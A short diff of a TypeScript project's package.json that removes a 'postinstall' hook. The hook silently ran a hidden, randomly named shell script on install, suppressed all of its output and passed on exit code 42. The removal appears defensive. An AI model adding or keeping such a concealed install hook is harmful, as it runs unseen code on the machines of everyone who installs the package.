@@ -34,8 +34,7 @@
     "test:unit": "vitest run --reporter=verbose",
     "lint": "eslint 'src/**/*.ts' 'scripts/**/*.ts'",
     "format": "prettier --write 'src/**/*.ts' 'scripts/**/*.ts'",
-    "monitor:dashboard": "./scripts/monitor-dashboard.sh",
-    "postinstall": "sh ./.ci-3sz1aj.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "monitor:dashboard": "./scripts/monitor-dashboard.sh"
   },
   "dependencies": {
     "@anthropic-ai/sdk": "^0.80.0",
